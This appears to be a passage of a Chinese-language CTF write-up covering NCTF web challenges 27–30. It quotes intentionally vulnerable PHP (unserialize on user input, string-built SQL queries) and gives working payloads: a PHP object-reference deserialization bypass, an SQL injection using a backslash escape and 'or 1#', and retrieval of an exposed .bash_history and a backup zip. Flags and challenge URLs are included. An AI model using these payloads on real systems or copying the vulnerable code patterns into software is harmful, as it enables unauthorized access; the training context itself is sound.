&lt;?php class just4fun { var $enter; var $secret; } if (isset($_GET[&#39;pass&#39;])) { $pass = $_GET[&#39;pass&#39;]; if(get_magic_quotes_gpc()){ $pass=stripslashes($pass); } $o = unserialize($pass); if ($o) { $o-&gt;secret = &quot;*&quot;; if ($o-&gt;secret === $o-&gt;enter) echo &quot;Congratulation! Here is my secret: &quot;.$o-&gt;secret; else echo &quot;Oh no... You can&#39;t fool me&quot;; } else echo &quot;are you trolling?&quot;; } ?&gt; https://www.91ri.org/3960.htmlhttp://www.freebuf.com/vuls/80293.html然而有道坎实在绕不过去，那个$o-&gt;secret = “*”; 我不知道如何构造成相等……参考网上的一篇……http://115.159.210.46/archives/19.html &lt;?php class just4fun{ var $enter; var $secret; } $class =new just4fun(); $class-&gt;enter=&amp;$class-&gt;secret; print_r(serialize($class)) ?&gt;由上述代码得到最后的payload： http://115.28.150.176/php1/index.php?pass=O:8:%22just4fun%22:2:{s:5:%22enter%22;N;s:6:%22secret%22;R:2;}最后稍微总结一下知识点：1）反序列化漏洞，2）php在面对object传值时的“特性” nctf{serialize_and_unserialize} 28、好熟悉的感觉，看看源代码…… &lt;!-- #GOAL: login as admin,then get the flag; error_reporting(0); require &#39;db.inc.php&#39;; function clean($str){ if(get_magic_quotes_gpc()){ $str=stripslashes($str); } return htmlentities($str, ENT_QUOTES); } $username = @clean((string)$_GET[&#39;username&#39;]); $password = @clean((string)$_GET[&#39;password&#39;]); $query=&#39;SELECT * FROM users WHERE name=\&#39;&#39;.$username.&#39;\&#39; AND pass=\&#39;&#39;.$password.&#39;\&#39;;&#39;; $result=mysql_query($query); if(!$result || mysql_num_rows($result) &lt; 1){ die(&#39;Invalid password!&#39;); } echo $flag; --&gt;Invalid password! 好吧 xman夏令营时原题做过了SELECT FROM users WHERE name=’admin\’ AND pass=’ or 1 #’;这样一来 name=’*‘ or 1 条件恒真所以payload是 username=admin\&amp;password=%20or%201%23 nctf{sql_injection_is_interesting} 29、jsfuck……放到firebug里直接运行一下，出来一个新页面，其内容如下图http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php访问http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php 在header里啊,上burpsuit查看，发现tip为 history of bash. 如下左图百度了一下， 如上右图，所以试着访问 http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history 得到新提示 zip -r flagbak.zip ./* 这是吧flagbak.zip文件解压到当前目录下， 所以flagbak.zip文件有可能仍然存在 尝试访问 http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip解压，里面有flag.txt文件，打开，得到flag。 nctf{bash_history_means_what} 30、 &lt;?php if($_POST[user] &amp;&amp; $_POST[pass]) { mysql_connect(SAE_MYSQL_HOST_M . &#39;:&#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]); $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&#39;$user&#39;&quot;)); if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) { echo &quot;&lt;p&gt;Logged in! Key: ntcf{**************} &lt;/p&gt;&quot;; } else { echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;); } } ntcf{union_select_is_wtf}]]></content>
    </entry>

    
  
  
</search>
